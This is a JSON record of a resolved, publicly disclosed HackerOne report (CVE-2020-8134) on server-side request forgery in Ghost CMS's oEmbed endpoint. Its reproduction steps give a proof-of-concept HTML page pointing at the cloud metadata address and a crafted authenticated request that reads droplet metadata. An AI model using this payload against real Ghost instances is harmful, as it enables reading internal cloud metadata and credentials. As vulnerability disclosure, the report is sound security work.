{
  "id": 793704,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTM3MDQ=",
  "url": "https://hackerone.com/reports/793704",
  "title": "Server-Side Request Forgery (SSRF) in Ghost CMS ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-02-11T16:33:58.658Z",
  "submitted_at": "2020-02-11T16:33:58.658Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "whoareme",
    "url": "/whoareme",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/212jdq5mqcb6ryq16xv28rzsmehi/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8134"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-03-09T12:21:11.600Z",
  "bug_reporter_agreed_on_going_public_at": "2020-03-09T12:21:11.526Z",
  "team_member_agreed_on_going_public_at": "2020-03-09T12:11:23.352Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report about SSRF vulnerability in CMS Ghost blog\n\nIt allows attacker able to send a crafted GET request from a vulnerable web application\n\n# Module\n\n**module name:** ghost\n**version:** 3.5.2\n**npm page:** `https://www.npmjs.com/package/ghost`\n**website page** `https://ghost.org/`\n\n## Module Description\n\nGhost is the world‚Äôs most popular open source headless Node.js CMS. \n\n## Module Stats\n\n4,812 weekly downloads\n\nThis CMS is used around 512,000 times for creating Blogs in 2018 according to Ghost statics. Currently the biggest customers of this blog are: Apple, Elon Musk's OpenAI team, Tinder, DigitalOcean, DuckDuckGo, Mozilla, Airtable, Revolt, etc.\n\n# Vulnerability\nAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a CMS Ghost Blog instance's to internal / external network.\n\n## Vulnerability Description\nCMS Ghost allows publishers to set up embed content from many sources (like Youtube, Twitter, Instagram, etc).\nF713079\n\nWhen click you click on the ‚ÄúOther‚Ä¶‚Äù button you can see the following input.\nF713080\nThis input are send request to the route which is vulnerable for the SSRF attack. Let's discover it! \nWhen you try to pass some URL into this input we receive response like that:\n```\nGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed\n```\nF713081\nIn my case I trying to receive DigitalOcean MetaData from my server.\n\nBut, sadly In that moment we receive only validation error. That‚Äôs because responsible for that function [query()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L145) doesn‚Äôt receive any content from function fetchOembedData().\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nmodule.exports = {\n    docName: 'oembed',\n    read: {\n        permissions: false,\n        data: [\n            'url',\n            'type'\n        ],\n        options: [],\n        query({data}) {\n            let {url, type} = data;\n\n            if (type === 'bookmark') {\n                return fetchBookmarkData(url);\n            }\n\n            return fetchOembedData(url).then((response) => {\n                if (!response && !type) {\n                    return fetchBookmarkData(url);\n                }\n                return response;\n            }).then((response) => {\n                if (!response) {\n                    return unknownProvider(url);\n                }\n                return response;\n            }).catch(() => {\n                return unknownProvider(url);\n            });\n        }\n    }\n};\n```\nIf we add breakpoint in fetchOembedData() function. And when will go across all lines of code in this function. We will notice interesting function that is call [getOembedUrlFromHTML()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L109)\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nfunction fetchOembedData(url) {\n    let provider;\n    ({url, provider} = findUrlWithProvider(url));\n    if (provider) {\n        return knownProvider(url);\n    }\n    return request(url, {\n        method: 'GET',\n        timeout: 2 * 1000,\n        followRedirect: true,\n        headers: {\n            'user-agent': 'Ghost(https://github.com/TryGhost/Ghost)'\n        }\n    }).then((response) => {\n        if (response.url !== url) {\n            ({url, provider} = findUrlWithProvider(response.url));\n        }\n        if (provider) {\n            return knownProvider(url);\n        }\n        const oembedUrl = getOembedUrlFromHTML(response.body);\n        if (oembedUrl) {\n            return request(oembedUrl, {\n                method: 'GET',\n                json: true\n            }).then((response) => {\n                return response.body;\n            }).catch(() => {});\n        }\n    });\n}\n```\nThis [function](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L70) is responsible for getting oEmbed URL from external resources.\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nconst getOembedUrlFromHTML = (html) => {\n    return cheerio('link[type=\"application/json+oembed\"]', html).attr('href');\n};\n```\n>\"oEmbed is a format for allowing an embedded representation of a URL on third party sites. The simple API allows a website to display embedded content (such as photos or videos) when a user posts a link to that resource, without having to parse the resource directly.\"\n\nAnd here we can notice before and after executing getOembedUrlFromHTML() function don‚Äôt exist any validation which can prevent against from the SSRF attacks.  \n\n## Steps To Reproduce:\n\nCurrently, we know how we can bypass validation in vulnerable route and now we can easily create exploit for this.\n\nFirst of all, we should create an HTML page with  \"link[type=\"application/json+oembed‚Äù]‚Äù malicious URL which we would like to discover:\n ```\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Security Testing</title>\n    <link rel=\"alternate\" type=\"application/json+oembed\" href=\"http://169.254.169.254/metadata/v1.json\"/>\n</head>\n<body></body>\n</html>\n```\n\nAnd serve this page by the Python SimpleHTTPServer module:\n \n```python -m SimpleHTTPServer 8000```\n\nIf your target is located in not your local network you can use ngrok library for creating a tunnel to your HTML page.\n \nAnd send the following request with publisher Cookies\n```\nGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed HTTP/1.1\nHost: YOUR_WEBSITE\nConnection: keep-alive\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nX-Ghost-Version: 3.5\nApp-Pragma: no-cache\nUser-Agent: Mozilla/5.0\nContent-Type: application/json; charset=UTF-8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US;\nCookie: ghost-admin-api-session=YOUR_SESSION\n```\nAnd we finally receive a response from the internal DigitalOcean service with my Droplet MetaData. \nSSRF vulnerability is working! ü•≥\n\nF713098\n\n## Supporting Material/References:\n- OS: macOS current\n- Node.js: 10.15.2\n- NPM: 6.11.3\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Yes\n- I opened an issue in the related repository: No\n\n## Impact\n\nAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance's to internal / external network.",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 713079,
      "file_name": "2020-02-11_17.06.04.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8R6BtYCJ4Ci28myo5foMTcNe?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.04.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.04.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T121152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=005c17a8769ff6bcde80f2f3ad5bdf9293e53b3ddcb62673af0397cc6f047c7d",
      "file_size": 88145,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 713080,
      "file_name": "2020-02-11_17.06.41.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXGSvBzFWe67r3pREuWmynY2?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.41.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.41.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T121152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=420c790c139ce88a868960bc00fe41015bdba077d29945deba83a81c197e621e",
      "file_size": 14189,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 713081,
      "file_name": "2020-02-11_17.56.17.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GGRKvEzhgCvMW6nYeGGkHkPZ?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.56.17.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.56.17.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T121152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c7e92ae69cf78cf283eef579b0bd6c358f503fb58886a2f9ad7c0850d5f37a5b",
      "file_size": 120399,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 713098,
      "file_name": "2020-02-11_17.07.09.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uhMWrcSeLT9gmA25QFQK5okF?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.07.09.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.07.09.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T121152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=135c3e30471a7e0095a2e90473931480ce8f177b6f37f0dcc0073573deb99b1b",
      "file_size": 82168,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-04-08T12:11:23.457Z",
  "allow_singular_disclosure_after": -172108829.03191182,
  "singular_disclosure_allowed": true,
  "vote_count": 41,
  "voters": [
    "taha",
    "whoareme",
    "7urb0",
    "ermilov",
    "n1m0",
    "a_d_a_m",
    "cdl",
    "tess",
    "tuo4n8",
    "mik317",
    "and 31 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 49350,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Ghost",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
